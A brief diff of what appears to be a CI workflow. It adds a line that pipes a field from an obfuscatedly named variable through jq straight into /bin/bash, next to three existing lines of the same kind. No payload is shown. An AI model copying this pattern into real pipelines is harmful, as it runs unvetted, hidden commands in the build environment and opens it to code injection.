@@ -21,6 +21,7 @@ jobs:
           printf '%s' "$alua7496" | jq -r .vm665 | /bin/bash
           printf '%s' "$yq18" | jq -r .nk99532 | /bin/bash
           printf '%s' "$oivy91291" | jq -r .gclr561 | /bin/bash
+          echo $h26021 | jq -r .po1 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
